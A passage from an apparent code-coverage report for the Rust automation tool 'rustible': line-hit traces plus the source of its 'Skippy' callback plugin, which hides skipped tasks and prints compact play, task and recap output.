\u0026callback2.match_count));\n    }\n\n    #[test]\n    fn test_format_match_output() {\n        let callback = SelectiveCallback::default();\n\n        let ok_result = create_execution_result(\"host1\", \"task1\", true, false, false, \"ok\");\n        let output = callback.format_match(\u0026ok_result);\n        assert!(output.contains(\"host1\"));\n        assert!(output.contains(\"task1\"));\n        assert!(output.contains(\"MATCHED\"));\n\n        let failed_result =\n            create_execution_result(\"host1\", \"task1\", false, false, false, \"error msg\");\n        let output = callback.format_match(\u0026failed_result);\n        assert!(output.contains(\"error msg\"));\n    }\n}\n","traces":[{"line":89,"address":[28994128],"length":1,"stats":{"Line":1}},{"line":98,"address":[28993856],"length":1,"stats":{"Line":1}},{"line":107,"address":[28993681,28993456,28993675],"length":1,"stats":{"Line":0}},{"line":109,"address":[30494003,30493968],"length":1,"stats":{"Line":0}},{"line":115,"address":[28993936],"length":1,"stats":{"Line":1}},{"line":117,"address":[28993959,28993982],"length":1,"stats":{"Line":2}},{"line":118,"address":[28993991],"length":1,"stats":{"Line":1}},{"line":122,"address":[28994015,28993969],"length":1,"stats":{"Line":2}},{"line":123,"address":[28994024],"length":1,"stats":{"Line":1}},{"line":127,"address":[28994060,28994002],"length":1,"stats":{"Line":1}},{"line":128,"address":[28994069],"length":1,"stats":{"Line":0}},{"line":132,"address":[28994044],"length":1,"stats":{"Line":1}},{"line":133,"address":[28994081],"length":1,"stats":{"Line":0}},{"line":134,"address":[28994103],"length":1,"stats":{"Line":0}},{"line":139,"address":[28994120],"length":1,"stats":{"Line":1}},{"line":143,"address":[28993696],"length":1,"stats":{"Line":0}},{"line":144,"address":[28993706,28993752],"length":1,"stats":{"Line":0}},{"line":145,"address":[28993731],"length":1,"stats":{"Line":0}},{"line":146,"address":[28993775,28993720],"length":1,"stats":{"Line":0}},{"line":147,"address":[28993754],"length":1,"stats":{"Line":0}},{"line":148,"address":[28993825,28993782,28993848],"length":1,"stats":{"Line":0}},{"line":149,"address":[28993827],"length":1,"stats":{"Line":0}},{"line":151,"address":[28993804],"length":1,"stats":{"Line":0}},{"line":197,"address":[28994517,28994208],"length":1,"stats":{"Line":1}},{"line":198,"address":[28994344,28994222,28994275,28994291],"length":1,"stats":{"Line":3}},{"line":200,"address":[28994237],"length":1,"stats":{"Line":1}},{"line":201,"address":[30494032,30494067],"length":1,"stats":{"Line":3}},{"line":202,"address":[28994265,28994318],"length":1,"stats":{"Line":1}},{"line":203,"address":[28994419,28994362,28994435,28994485],"length":1,"stats":{"Line":3}},{"line":205,"address":[28994381],"length":1,"stats":{"Line":1}},{"line":206,"address":[28994396],"length":1,"stats":{"Line":3}},{"line":207,"address":[28994409,28994462],"length":1,"stats":{"Line":1}},{"line":284,"address":[29006230,29004720,29006173],"length":1,"stats":{"Line":1}},{"line":285,"address":[29004762],"length":1,"stats":{"Line":1}},{"line":287,"address":[29004842],"length":1,"stats":{"Line":1}},{"line":290,"address":[30494752,30494787],"length":1,"stats":{"Line":3}},{"line":293,"address":[29004986],"length":1,"stats":{"Line":1}},{"line":296,"address":[29005093],"length":1,"stats":{"Line":3}},{"line":303,"address":[29005316,29005253],"length":1,"stats":{"Line":2}},{"line":304,"address":[29005369,29005424],"length":1,"stats":{"Line":2}},{"line":305,"address":[29005538,29005459],"length":1,"stats":{"Line":2}},{"line":306,"address":[29005573,29005625],"length":1,"stats":{"Line":2}},{"line":307,"address":[29005650,29005722],"length":1,"stats":{"Line":2}},{"line":308,"address":[29005824,29005772],"length":1,"stats":{"Line":2}},{"line":309,"address":[29005911,29005859],"length":1,"stats":{"Line":2}},{"line":315,"address":[29006272],"length":1,"stats":{"Line":1}},{"line":316,"address":[29006280],"length":1,"stats":{"Line":1}},{"line":321,"address":[29000160],"length":1,"stats":{"Line":1}},{"line":322,"address":[29000177],"length":1,"stats":{"Line":1}},{"line":327,"address":[28997936],"length":1,"stats":{"Line":1}},{"line":328,"address":[28997953],"length":1,"stats":{"Line":1}},{"line":333,"address":[29006304],"length":1,"stats":{"Line":0}},{"line":334,"address":[29006347],"length":1,"stats":{"Line":0}},{"line":339,"address":[29000432],"length":1,"stats":{"Line":0}},{"line":340,"address":[29000474],"length":1,"stats":{"Line":0}},{"line":341,"address":[29000496],"length":1,"stats":{"Line":0}},{"line":342,"address":[30494496,30494512],"length":1,"stats":{"Line":0}},{"line":347,"address":[28999590,28999472,28999596],"length":1,"stats":{"Line":0}},{"line":348,"address":[28999481,28999563],"length":1,"stats":{"Line":0}},{"line":352,"address":[28997919,28997925,28997680],"length":1,"stats":{"Line":0}},{"line":353,"address":[28997694],"length":1,"stats":{"Line":0}},{"line":354,"address":[28997804],"length":1,"stats":{"Line":0}},{"line":359,"address":[29002576,29002909],"length":1,"stats":{"Line":1}},{"line":360,"address":[29002622,29002703],"length":1,"stats":{"Line":2}},{"line":361,"address":[29002737,29002793],"length":1,"stats":{"Line":2}},{"line":365,"address":[28999616],"length":1,"stats":{"Line":1}},{"line":367,"address":[28999649],"length":1,"stats":{"Line":1}},{"line":370,"address":[28999676],"length":1,"stats":{"Line":3}},{"line":372,"address":[28999752],"length":1,"stats":{"Line":1}},{"line":375,"address":[28999822,28999777],"length":1,"stats":{"Line":2}},{"line":376,"address":[28999840],"length":1,"stats":{"Line":1}},{"line":380,"address":[28999797],"length":1,"stats":{"Line":1}},{"line":381,"address":[28999861],"length":1,"stats":{"Line":1}},{"line":382,"address":[28999847],"length":1,"stats":{"Line":1}},{"line":387,"address":[28999888],"length":1,"stats":{"Line":1}},{"line":389,"address":[28999921],"length":1,"stats":{"Line":1}},{"line":392,"address":[28999948],"length":1,"stats":{"Line":3}},{"line":394,"address":[29000024],"length":1,"stats":{"Line":1}},{"line":397,"address":[29000094,29000049],"length":1,"stats":{"Line":2}},{"line":398,"address":[29000112],"length":1,"stats":{"Line":1}},{"line":402,"address":[29000069],"length":1,"stats":{"Line":1}},{"line":403,"address":[29000133],"length":1,"stats":{"Line":1}},{"line":404,"address":[29000119],"length":1,"stats":{"Line":0}},{"line":409,"address":[28997376,28997656,28997662],"length":1,"stats":{"Line":1}},{"line":411,"address":[28997410],"length":1,"stats":{"Line":1}},{"line":412,"address":[28997480],"length":1,"stats":{"Line":1}},{"line":415,"address":[28997431],"length":1,"stats":{"Line":1}},{"line":416,"address":[28997468,28997536],"length":1,"stats":{"Line":2}},{"line":418,"address":[30494256],"length":1,"stats":{"Line":2}},{"line":419,"address":[30494288,30494352,30494366],"length":1,"stats":{"Line":3}},{"line":423,"address":[28997592],"length":1,"stats":{"Line":1}},{"line":424,"address":[28997629],"length":1,"stats":{"Line":1}},{"line":425,"address":[28997615],"length":1,"stats":{"Line":0}},{"line":430,"address":[29000240],"length":1,"stats":{"Line":1}},{"line":432,"address":[29000277],"length":1,"stats":{"Line":1}},{"line":433,"address":[29000299],"length":1,"stats":{"Line":1}},{"line":437,"address":[29000311],"length":1,"stats":{"Line":1}},{"line":438,"address":[29000350],"length":1,"stats":{"Line":0}},{"line":442,"address":[29000362],"length":1,"stats":{"Line":1}},{"line":443,"address":[29000388],"length":1,"stats":{"Line":0}},{"line":447,"address":[29000405],"length":1,"stats":{"Line":1}},{"line":455,"address":[28999456,28998016,28999399],"length":1,"stats":{"Line":1}},{"line":456,"address":[28998067],"length":1,"stats":{"Line":1}},{"line":458,"address":[28998146],"length":1,"stats":{"Line":1}},{"line":459,"address":[28998171],"length":1,"stats":{"Line":0}},{"line":460,"address":[28998160],"length":1,"stats":{"Line":1}},{"line":461,"address":[28998196],"length":1,"stats":{"Line":1}},{"line":462,"address":[28998248],"length":1,"stats":{"Line":1}},{"line":463,"address":[28998313],"length":1,"stats":{"Line":0}},{"line":465,"address":[28998288],"length":1,"stats":{"Line":1}},{"line":468,"address":[28998428,28998551,28998632],"length":1,"stats":{"Line":1}},{"line":470,"address":[28998269,28998379],"length":1,"stats":{"Line":2}},{"line":471,"address":[28998411,28998479],"length":1,"stats":{"Line":2}},{"line":472,"address":[28998605,28998530],"length":1,"stats":{"Line":2}},{"line":476,"address":[28999055,28999185,28999132],"length":1,"stats":{"Line":3}},{"line":477,"address":[28999196],"length":1,"stats":{"Line":1}},{"line":479,"address":[28999089],"length":1,"stats":{"Line":1}},{"line":484,"address":[29003832,29002944,29004701],"length":1,"stats":{"Line":0}},{"line":485,"address":[29002990],"length":1,"stats":{"Line":0}},{"line":487,"address":[29003011],"length":1,"stats":{"Line":0}},{"line":488,"address":[29003078,29003156],"length":1,"stats":{"Line":0}},{"line":490,"address":[29003374],"length":1,"stats":{"Line":0}},{"line":491,"address":[29003486,29003411],"length":1,"stats":{"Line":0}},{"line":494,"address":[29003444,29003843],"length":1,"stats":{"Line":0}},{"line":495,"address":[29003957,29003855],"length":1,"stats":{"Line":0}},{"line":496,"address":[29004129,29003997],"length":1,"stats":{"Line":0}},{"line":498,"address":[29004099],"length":1,"stats":{"Line":0}},{"line":501,"address":[29004315],"length":1,"stats":{"Line":0}},{"line":506,"address":[29003030],"length":1,"stats":{"Line":0}},{"line":510,"address":[29002552,29000576,29002546],"length":1,"stats":{"Line":0}},{"line":511,"address":[29000638],"length":1,"stats":{"Line":0}},{"line":512,"address":[29000665],"length":1,"stats":{"Line":0}},{"line":513,"address":[29000708],"length":1,"stats":{"Line":0}},{"line":514,"address":[29000750],"length":1,"stats":{"Line":0}},{"line":516,"address":[29000724],"length":1,"stats":{"Line":0}},{"line":519,"address":[29001755,29001349,29001119,29001185,29001283,29001611,29000955,29001677,29001447,29000857,29001513,29001021],"length":1,"stats":{"Line":0}},{"line":522,"address":[29000769,29000840,29000908],"length":1,"stats":{"Line":0}},{"line":523,"address":[29000932,29001004,29001072],"length":1,"stats":{"Line":0}},{"line":524,"address":[29001168,29001096,29001236],"length":1,"stats":{"Line":0}},{"line":525,"address":[29001260,29001332,29001400],"length":1,"stats":{"Line":0}},{"line":526,"address":[29001496,29001424,29001564],"length":1,"stats":{"Line":0}},{"line":527,"address":[29001588,29001660,29001728],"length":1,"stats":{"Line":0}},{"line":533,"address":[28990192],"length":1,"stats":{"Line":1}},{"line":534,"address":[28990208],"length":1,"stats":{"Line":1}},{"line":539,"address":[29009991,29009088,29009997],"length":1,"stats":{"Line":1}},{"line":541,"address":[29009123],"length":1,"stats":{"Line":1}},{"line":542,"address":[29009133],"length":1,"stats":{"Line":1}},{"line":543,"address":[29009197],"length":1,"stats":{"Line":1}},{"line":544,"address":[29009261,29009327],"length":1,"stats":{"Line":2}},{"line":545,"address":[29009401,29009335],"length":1,"stats":{"Line":2}},{"line":546,"address":[29009475,29009409],"length":1,"stats":{"Line":2}},{"line":547,"address":[29009483,29009549],"length":1,"stats":{"Line":2}},{"line":548,"address":[29009623,29009557],"length":1,"stats":{"Line":2}},{"line":549,"address":[29009697,29009631],"length":1,"stats":{"Line":2}},{"line":550,"address":[29009705],"length":1,"stats":{"Line":1}},{"line":558,"address":[30488719,30490384,30490304,30488688,30488845,30490320,30488815],"length":1,"stats":{"Line":0}},{"line":559,"address":[30488789,30488922],"length":1,"stats":{"Line":0}},{"line":560,"address":[30489132,30490326,30489350,30489105,30489418],"length":1,"stats":{"Line":0}},{"line":563,"address":[30489555],"length":1,"stats":{"Line":0}},{"line":564,"address":[30489706],"length":1,"stats":{"Line":0}},{"line":565,"address":[30489853],"length":1,"stats":{"Line":0}},{"line":566,"address":[30490003],"length":1,"stats":{"Line":0}},{"line":569,"address":[30490153],"length":1,"stats":{"Line":0}},{"line":573,"address":[28990491],"length":1,"stats":{"Line":0}},{"line":574,"address":[30483175,30483274],"length":1,"stats":{"Line":0}},{"line":575,"address":[30483390,30483320],"length":1,"stats":{"Line":0}},{"line":576,"address":[30483540],"length":1,"stats":{"Line":0}},{"line":577,"address":[30483711],"length":1,"stats":{"Line":0}},{"line":580,"address":[30483874],"length":1,"stats":{"Line":0}},{"line":585,"address":[30483971,30483909],"length":1,"stats":{"Line":0}},{"line":586,"address":[30484055,30483998],"length":1,"stats":{"Line":0}},{"line":590,"address":[30484205,30484308,30484374,30484452,30484130],"length":1,"stats":{"Line":0}},{"line":598,"address":[30484881,30484821],"length":1,"stats":{"Line":0}},{"line":599,"address":[30484927,30484992],"length":1,"stats":{"Line":0}},{"line":601,"address":[30484999,30485191],"length":1,"stats":{"Line":0}},{"line":602,"address":[30486029,30485259],"length":1,"stats":{"Line":0}},{"line":604,"address":[30486110],"length":1,"stats":{"Line":0}},{"line":605,"address":[30486141],"length":1,"stats":{"Line":0}},{"line":611,"address":[30485289],"length":1,"stats":{"Line":0}},{"line":612,"address":[30485349,30485419],"length":1,"stats":{"Line":0}},{"line":613,"address":[30485434],"length":1,"stats":{"Line":0}},{"line":614,"address":[30485563,30485469],"length":1,"stats":{"Line":0}},{"line":616,"address":[30485438,30485500],"length":1,"stats":{"Line":0}},{"line":619,"address":[30485537,30485609],"length":1,"stats":{"Line":0}},{"line":629,"address":[30482583,30482935,30482492,30482464,30482854,30482556],"length":1,"stats":{"Line":0}},{"line":630,"address":[30482627,30482537],"length":1,"stats":{"Line":0}},{"line":631,"address":[30482661,30482734],"length":1,"stats":{"Line":0}},{"line":632,"address":[30482825,30482874],"length":1,"stats":{"Line":0}},{"line":637,"address":[28990283],"length":1,"stats":{"Line":0}},{"line":642,"address":[30482995,30482976],"length":1,"stats":{"Line":0}},{"line":647,"address":[28990558],"length":1,"stats":{"Line":0}},{"line":649,"address":[30486509,30486608],"length":1,"stats":{"Line":0}},{"line":653,"address":[30486795],"length":1,"stats":{"Line":0}},{"line":654,"address":[30486934,30486871],"length":1,"stats":{"Line":0}},{"line":655,"address":[30487087,30487027],"length":1,"stats":{"Line":0}},{"line":658,"address":[30487072,30487579],"length":1,"stats":{"Line":0}},{"line":659,"address":[30487576,30487584,30487139],"length":1,"stats":{"Line":0}},{"line":660,"address":[30487116],"length":1,"stats":{"Line":0}},{"line":661,"address":[30487243,30487175,30487265],"length":1,"stats":{"Line":0}},{"line":662,"address":[30487291,30487246],"length":1,"stats":{"Line":0}},{"line":663,"address":[30487497,30487201,30487535],"length":1,"stats":{"Line":0}},{"line":664,"address":[30487540,30487464,30487532],"length":1,"stats":{"Line":0}},{"line":666,"address":[30487438,30487494,30487499],"length":1,"stats":{"Line":0}},{"line":671,"address":[30487621],"length":1,"stats":{"Line":0}},{"line":673,"address":[30487678],"length":1,"stats":{"Line":0}},{"line":676,"address":[30487869],"length":1,"stats":{"Line":0}},{"line":677,"address":[30487933,30487993],"length":1,"stats":{"Line":0}},{"line":678,"address":[30488118,30488077],"length":1,"stats":{"Line":0}},{"line":682,"address":[30488147],"length":1,"stats":{"Line":0}},{"line":683,"address":[30488207,30488407],"length":1,"stats":{"Line":0}},{"line":685,"address":[30488237,30488172],"length":1,"stats":{"Line":0}},{"line":691,"address":[28990739],"length":1,"stats":{"Line":0}},{"line":696,"address":[28990616],"length":1,"stats":{"Line":0}},{"line":710,"address":[28995920],"length":1,"stats":{"Line":1}},{"line":711,"address":[28995928],"length":1,"stats":{"Line":1}},{"line":716,"address":[28996352,28996665],"length":1,"stats":{"Line":1}},{"line":717,"address":[28996484,28996416],"length":1,"stats":{"Line":2}},{"line":718,"address":[28996644,28996571],"length":1,"stats":{"Line":2}},{"line":720,"address":[28996616],"length":1,"stats":{"Line":1}},{"line":724,"address":[28994624,28995034],"length":1,"stats":{"Line":1}},{"line":726,"address":[28994688,28994751],"length":1,"stats":{"Line":2}},{"line":727,"address":[28994920],"length":1,"stats":{"Line":1}},{"line":728,"address":[28994968],"length":1,"stats":{"Line":1}},{"line":733,"address":[28995824],"length":1,"stats":{"Line":1}},{"line":734,"address":[28995832],"length":1,"stats":{"Line":1}},{"line":735,"address":[28995839],"length":1,"stats":{"Line":1}},{"line":740,"address":[28996688,28997001],"length":1,"stats":{"Line":1}},{"line":741,"address":[28996752,28996820],"length":1,"stats":{"Line":2}},{"line":742,"address":[28996980,28996907],"length":1,"stats":{"Line":2}},{"line":744,"address":[28996952],"length":1,"stats":{"Line":1}},{"line":748,"address":[28995798,28995376],"length":1,"stats":{"Line":1}},{"line":750,"address":[28995503,28995440],"length":1,"stats":{"Line":2}},{"line":751,"address":[28995677],"length":1,"stats":{"Line":1}},{"line":752,"address":[28995732],"length":1,"stats":{"Line":1}},{"line":757,"address":[28995856],"length":1,"stats":{"Line":0}},{"line":758,"address":[28995864],"length":1,"stats":{"Line":0}},{"line":759,"address":[28995871],"length":1,"stats":{"Line":0}},{"line":764,"address":[28995888],"length":1,"stats":{"Line":1}},{"line":765,"address":[28995896],"length":1,"stats":{"Line":1}},{"line":766,"address":[28995903],"length":1,"stats":{"Line":1}},{"line":771,"address":[28994560],"length":1,"stats":{"Line":1}},{"line":772,"address":[28994568],"length":1,"stats":{"Line":1}},{"line":773,"address":[28994575],"length":1,"stats":{"Line":1}},{"line":778,"address":[28995344],"length":1,"stats":{"Line":0}},{"line":779,"address":[28995352],"length":1,"stats":{"Line":0}},{"line":780,"address":[28995359],"length":1,"stats":{"Line":0}},{"line":785,"address":[28997056,28997350],"length":1,"stats":{"Line":0}},{"line":786,"address":[28997117,28997185],"length":1,"stats":{"Line":0}},{"line":787,"address":[28997327],"length":1,"stats":{"Line":0}},{"line":792,"address":[28995952,28996265],"length":1,"stats":{"Line":1}},{"line":793,"address":[28996084,28996016],"length":1,"stats":{"Line":2}},{"line":794,"address":[28996244,28996171],"length":1,"stats":{"Line":2}},{"line":796,"address":[28996216],"length":1,"stats":{"Line":1}},{"line":801,"address":[28994592],"length":1,"stats":{"Line":0}},{"line":802,"address":[28994600],"length":1,"stats":{"Line":0}},{"line":803,"address":[28994607],"length":1,"stats":{"Line":0}},{"line":808,"address":[28997024],"length":1,"stats":{"Line":1}},{"line":809,"address":[28997032],"length":1,"stats":{"Line":1}},{"line":810,"address":[28997039],"length":1,"stats":{"Line":1}},{"line":815,"address":[28994528],"length":1,"stats":{"Line":1}},{"line":816,"address":[28994536],"length":1,"stats":{"Line":1}},{"line":817,"address":[28994543],"length":1,"stats":{"Line":1}},{"line":822,"address":[28995317,28995056],"length":1,"stats":{"Line":1}},{"line":823,"address":[28995169,28995114],"length":1,"stats":{"Line":2}},{"line":824,"address":[28995294],"length":1,"stats":{"Line":1}},{"line":829,"address":[28996288],"length":1,"stats":{"Line":1}},{"line":830,"address":[28996304],"length":1,"stats":{"Line":1}}],"covered":142,"coverable":267},{"path":["/","home","artur","Repositories","rustible","src","callback","plugins","skippy.rs"],"content":"//! Skippy Callback Plugin for Rustible.\n//!\n//! This plugin minimizes output noise by hiding skipped tasks completely\n//! unless verbose mode is enabled. It focuses on showing only changed\n//! and failed tasks, making it ideal for large playbooks.\n//!\n//! # Features\n//!\n//! - **Silent Skipped Tasks**: Skipped tasks produce no output unless verbose\n//! - **Changed/Failed Focus**: Only shows tasks that made changes or failed\n//! - **Compact Output**: Minimal formatting for cleaner logs\n//! - **Summary Statistics**: Compact recap showing skip counts at end\n//! - **Configurable Verbosity**: Three levels of detail\n//!\n//! # Example Output (Default Mode)\n//!\n//! ```text\n//! PLAY [Configure webservers] *************************\n//!\n//! TASK [Install nginx] ********************************\n//! changed: [web1]\n//! changed: [web2]\n//!\n//! TASK [Deploy config] ********************************\n//! changed: [web1]\n//! failed: [web2] =\u003e Configuration file invalid\n//!\n//! PLAY RECAP ******************************************\n//! web1: ok=3 changed=2 failed=0 skipped=5\n//! web2: ok=2 changed=1 failed=1 skipped=5\n//!\n//! Skipped 10 tasks (use -v to show skipped)\n//! ```\n//!\n//! # Verbosity Levels\n//!\n//! - **Level 0**: Hide all skipped tasks, show only changed/failed\n//! - **Level 1**: Show skipped task names (no details)\n//! - **Level 2+**: Show full output including skip reasons\n\nuse std::collections::HashMap;\nuse std::sync::Arc;\nuse std::time::{Duration, Instant};\n\nuse async_trait::async_trait;\nuse colored::Colorize;\nuse tokio::sync::RwLock;\n\nuse crate::facts::Facts;\nuse crate::traits::{ExecutionCallback, ExecutionResult};\n\n/// Configuration for the Skippy callback plugin.\n#[derive(Debug, Clone)]\npub struct SkippyConfig {\n    /// Verbosity level (0 = hide skipped, 1 = show names, 2+ = full)\n    pub verbosity: u8,\n    /// Whether to show task timing information\n    pub show_timing: bool,\n    /// Whether to use colored output\n    pub use_color: bool,\n    /// Maximum task name length before truncation\n    pub max_task_name_length: usize,\n    /// Show host count instead of individual hosts for large inventories\n    pub aggregate_hosts_threshold: usize,\n    /// Whether to show the \"skipped N tasks\" summary\n    pub show_skip_summary: bool,\n}\n\nimpl Default for SkippyConfig {\n    fn default() -\u003e Self {\n        Self {\n            verbosity: 0,\n            show_timing: false,\n            use_color: true,\n            max_task_name_length: 60,\n            aggregate_hosts_threshold: 10,\n            show_skip_summary: true,\n        }\n    }\n}\n\nimpl SkippyConfig {\n    /// Creates a configuration with specified verbosity.\n    pub fn with_verbosity(verbosity: u8) -\u003e Self {\n        Self {\n            verbosity,\n            ..Default::default()\n        }\n    }\n\n    /// Enables timing display.\n    pub fn with_timing(mut self) -\u003e Self {\n        self.show_timing = true;\n        self\n    }\n\n    /// Disables colored output.\n    pub fn without_color(mut self) -\u003e Self {\n        self.use_color = false;\n        self\n    }\n}\n\n/// Statistics tracked per host during execution.\n#[derive(Debug, Clone, Default)]\nstruct HostStats {\n    /// Count of successful tasks (no changes)\n    ok: u32,\n    /// Count of tasks that made changes\n    changed: u32,\n    /// Count of failed tasks\n    failed: u32,\n    /// Count of skipped tasks\n    skipped: u32,\n    /// Count of unreachable attempts\n    unreachable: u32,\n}\n\nimpl HostStats {\n    /// Returns true if this host had any issues.\n    fn has_issues(\u0026self) -\u003e bool {\n        self.failed \u003e 0 || self.unreachable \u003e 0\n    }\n\n    /// Returns true if this host had any changes.\n    fn has_changes(\u0026self) -\u003e bool {\n        self.changed \u003e 0\n    }\n}\n\n/// Information about the current task being executed.\n#[derive(Debug, Clone)]\nstruct CurrentTask {\n    /// Task name\n    name: String,\n    /// Results collected so far for this task\n    results: Vec\u003cTaskHostResult\u003e,\n    /// When the task started\n    #[allow(dead_code)]\n    start_time: Instant,\n    /// Whether the header has been printed\n    header_printed: bool,\n}\n\n/// Result for a single host in a task.\n#[derive(Debug, Clone)]\nstruct TaskHostResult {\n    host: String,\n    status: TaskHostStatus,\n    message: Option\u003cString\u003e,\n    duration: Duration,\n}\n\n/// Status of a task on a single host.\n#[derive(Debug, Clone, Copy, PartialEq, Eq)]\nenum TaskHostStatus {\n    Ok,\n    Changed,\n    Failed,\n    Skipped,\n    Unreachable,\n}\n\n/// Skippy Callback Plugin - minimizes skipped task output.\n///\n/// This callback is designed for large playbooks where the majority of tasks\n/// are skipped due to conditions. It reduces noise by only showing tasks that\n/// actually made changes or failed.\n///\n/// # Usage\n///\n/// ```rust,ignore\n/// use rustible::callback::plugins::SkippyCallback;\n///\n/// // Default: hide all skipped tasks\n/// let callback = SkippyCallback::new();\n///\n/// // With verbosity: show skipped task names\n/// let callback = SkippyCallback::with_verbosity(1);\n///\n/// // Full configuration\n/// let config = SkippyConfig {\n///     verbosity: 1,\n///     show_timing: true,\n///     ..Default::default()\n/// };\n/// let callback = SkippyCallback::with_config(config);\n/// ```\n#[derive(Debug)]\npub struct SkippyCallback {\n    /// Configuration\n    config: SkippyConfig,\n    /// Per-host execution statistics\n    host_stats: Arc\u003cRwLock\u003cHashMap\u003cString, HostStats\u003e\u003e\u003e,\n    /// Current task being executed\n    current_task: Arc\u003cRwLock\u003cOption\u003cCurrentTask\u003e\u003e\u003e,\n    /// Playbook start time\n    start_time: Arc\u003cRwLock\u003cOption\u003cInstant\u003e\u003e\u003e,\n    /// Current playbook name\n    #[allow(dead_code)]\n    playbook_name: Arc\u003cRwLock\u003cOption\u003cString\u003e\u003e\u003e,\n    /// Total count of skipped tasks\n    total_skipped: Arc\u003cRwLock\u003cu32\u003e\u003e,\n    /// Whether any failures occurred\n    has_failures: Arc\u003cRwLock\u003cbool\u003e\u003e,\n    /// Names of tasks that were entirely skipped (for summary)\n    fully_skipped_tasks: Arc\u003cRwLock\u003cVec\u003cString\u003e\u003e\u003e,\n}\n\nimpl SkippyCallback {\n    /// Creates a new Skippy callback with default configuration.\n    ///\n    /// Default configuration hides all skipped tasks and only shows\n    /// changed/failed tasks.\n    #[must_use]\n    pub fn new() -\u003e Self {\n        Self::with_config(SkippyConfig::default())\n    }\n\n    /// Creates a new Skippy callback with specified verbosity.\n    ///\n    /// # Arguments\n    ///\n    /// * `verbosity` - 0 = hide skipped, 1 = show names, 2+ = full\n    #[must_use]\n    pub fn with_verbosity(verbosity: u8) -\u003e Self {\n        Self::with_config(SkippyConfig::with_verbosity(verbosity))\n    }\n\n    /// Creates a new Skippy callback with custom configuration.\n    #[must_use]\n    pub fn with_config(config: SkippyConfig) -\u003e Self {\n        Self {\n            config,\n            host_stats: Arc::new(RwLock::new(HashMap::new())),\n            current_task: Arc::new(RwLock::new(None)),\n            start_time: Arc::new(RwLock::new(None)),\n            playbook_name: Arc::new(RwLock::new(None)),\n            total_skipped: Arc::new(RwLock::new(0)),\n            has_failures: Arc::new(RwLock::new(false)),\n            fully_skipped_tasks: Arc::new(RwLock::new(Vec::new())),\n        }\n    }\n\n    /// Returns whether any failures occurred during execution.\n    pub async fn has_failures(\u0026self) -\u003e bool {\n        *self.has_failures.read().await\n    }\n\n    /// Returns the total number of skipped task executions.\n    pub async fn total_skipped(\u0026self) -\u003e u32 {\n        *self.total_skipped.read().await\n    }\n\n    /// Returns the list of fully skipped tasks.\n    pub async fn fully_skipped_tasks(\u0026self) -\u003e Vec\u003cString\u003e {\n        self.fully_skipped_tasks.read().await.clone()\n    }\n\n    /// Truncates a task name if it exceeds the maximum length.\n    fn truncate_name(\u0026self, name: \u0026str) -\u003e String {\n        if name.len() \u003c= self.config.max_task_name_length {\n            name.to_string()\n        } else {\n            format!(\n                \"{}...\",\n                \u0026name[..self.config.max_task_name_length.saturating_sub(3)]\n            )\n        }\n    }\n\n    /// Formats a task header line.\n    fn format_task_header(\u0026self, name: \u0026str) -\u003e String {\n        let truncated = self.truncate_name(name);\n        let padding_len = 70usize.saturating_sub(truncated.len() + 7);\n        let padding = \"*\".repeat(padding_len);\n\n        if self.config.use_color {\n            format!(\n                \"\\n{} [{}] {}\",\n                \"TASK\".bright_cyan().bold(),\n                truncated.bright_white(),\n                padding.bright_black()\n            )\n        } else {\n            format!(\"\\nTASK [{}] {}\", truncated, padding)\n        }\n    }\n\n    /// Formats a play header line.\n    fn format_play_header(\u0026self, name: \u0026str, host_count: usize) -\u003e String {\n        let padding_len = 70usize.saturating_sub(name.len() + 7);\n        let padding = \"*\".repeat(padding_len);\n\n        if self.config.use_color {\n            format!(\n                \"\\n{} [{}] {} ({} hosts)\",\n                \"PLAY\".bright_magenta().bold(),\n                name.bright_white().bold(),\n                padding.bright_black(),\n                host_count\n            )\n        } else {\n            format!(\"\\nPLAY [{}] {} ({} hosts)\", name, padding, host_count)\n        }\n    }\n\n    /// Formats a host result line.\n    fn format_host_result(\u0026self, result: \u0026TaskHostResult) -\u003e String {\n        let status_str = match result.status {\n            TaskHostStatus::Ok =\u003e {\n                if self.config.use_color {\n                    \"ok\".green().to_string()\n                } else {\n                    \"ok\".to_string()\n                }\n            }\n            TaskHostStatus::Changed =\u003e {\n                if self.config.use_color {\n                    \"changed\".yellow().to_string()\n                } else {\n                    \"changed\".to_string()\n                }\n            }\n            TaskHostStatus::Failed =\u003e {\n                if self.config.use_color {\n                    \"failed\".red().bold().to_string()\n                } else {\n                    \"FAILED\".to_string()\n                }\n            }\n            TaskHostStatus::Skipped =\u003e {\n                if self.config.use_color {\n                    \"skipping\".cyan().to_string()\n                } else {\n                    \"skipping\".to_string()\n                }\n            }\n            TaskHostStatus::Unreachable =\u003e {\n                if self.config.use_color {\n                    \"unreachable\".magenta().bold().to_string()\n                } else {\n                    \"UNREACHABLE\".to_string()\n                }\n            }\n        };\n\n        let host_str = if self.config.use_color {\n            result.host.bright_white().to_string()\n        } else {\n            result.host.clone()\n        };\n\n        let timing_str = if self.config.show_timing {\n            format!(\" ({:.2}s)\", result.duration.as_secs_f64())\n        } else {\n            String::new()\n        };\n\n        let message_str = match (\u0026result.status, \u0026result.message) {\n            (TaskHostStatus::Failed | TaskHostStatus::Unreachable, Some(msg)) =\u003e {\n                format!(\" =\u003e {}\", msg)\n            }\n            _ =\u003e String::new(),\n        };\n\n        format!(\n            \"{}: [{}]{}{}\",\n            status_str, host_str, timing_str, message_str\n        )\n    }\n\n    /// Formats the recap line for a single host.\n    fn format_recap_line(\u0026self, host: \u0026str, stats: \u0026HostStats) -\u003e String {\n        let host_color = if stats.has_issues() {\n            if self.config.use_color {\n                host.red().bold().to_string()\n            } else {\n                host.to_uppercase()\n            }\n        } else if stats.has_changes() {\n            if self.config.use_color {\n                host.yellow().to_string()\n            } else {\n                host.to_string()\n            }\n        } else if self.config.use_color {\n            host.green().to_string()\n        } else {\n            host.to_string()\n        };\n\n        let format_num = |n: u32, is_error: bool| -\u003e String {\n            if self.config.use_color {\n                if is_error \u0026\u0026 n \u003e 0 {\n                    n.to_string().red().bold().to_string()\n                } else if n \u003e 0 {\n                    n.to_string().yellow().to_string()\n                } else {\n                    n.to_string().bright_black().to_string()\n                }\n            } else {\n                n.to_string()\n            }\n        };\n\n        format!(\n            \"{:\u003c20} : ok={} changed={} failed={} skipped={} unreachable={}\",\n            host_color,\n            format_num(stats.ok, false),\n            format_num(stats.changed, false),\n            format_num(stats.failed, true),\n            format_num(stats.skipped, false),\n            format_num(stats.unreachable, true),\n        )\n    }\n\n    /// Flushes the current task results if any should be shown.\n    async fn flush_task(\u0026self) {\n        let mut current = self.current_task.write().await;\n\n        if let Some(task) = current.take() {\n            // Check if we have any non-skipped results\n            let has_visible_results = task\n                .results\n                .iter()\n                .any(|r| 